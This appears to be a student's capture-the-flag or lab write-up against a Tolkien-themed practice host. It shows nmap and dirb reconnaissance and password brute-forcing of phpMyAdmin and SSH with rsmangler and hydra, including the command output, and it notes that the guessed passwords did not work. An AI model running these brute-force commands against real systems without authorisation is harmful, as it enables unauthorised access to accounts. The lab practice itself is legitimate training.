# Nancurinir

Target:  nancurunir.shire.org (10.0.5.28)

## nmap scan
```
└─$ sudo nmap 10.0.5.28 -sS -sV -p-       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 11:36 EDT
Nmap scan report for 10.0.5.28
Host is up (0.0014s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

## directory enumeration
```
**└─$ dirb http://10.0.5.28 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 24 11:48:54 2026
URL_BASE: http://10.0.5.28/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.5.28/ ----
+ http://10.0.5.28/index.html (CODE:200|SIZE:269)                                          
==> DIRECTORY: http://10.0.5.28/phpmyadmin/                                                
+ http://10.0.5.28/server-status (CODE:403|SIZE:274)                                       
                                                                                           
-----------------
END_TIME: Tue Mar 24 11:48:57 2026
DOWNLOADED: 4612 - FOUND: 2
**
```

## DEAD END - guessing passwords
```
rsmangler --file gandalf.small.txt -o gandalf.mangled.txt --min 8 --max 12
```
php-myadmin brute force
```
hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 http-get /phpmyadmin/ -t 4
```
results
```
└─$ hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 http-get /phpmyadmin/ -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 11:51:08
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1597 login tries (l:1/p:1597), ~400 tries per task
[DATA] attacking http-get://10.0.5.28:80/phpmyadmin/
[80][http-get] host: 10.0.5.28   login: gandalf   password: staffwizard
[80][http-get] host: 10.0.5.28   login: gandalf   password: glamdring
[80][http-get] host: 10.0.5.28   login: gandalf   password: wizardstaff
[80][http-get] host: 10.0.5.28   login: gandalf   password: wizardnarya
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 11:51:09
```
this didn't work. it was just `shallnotpass` (found in source code)



## ssh brute force
```
sudo hydra -l gandalf -P gandalf.mangled.txt 10.0.5.28 -t 4 ssh
```
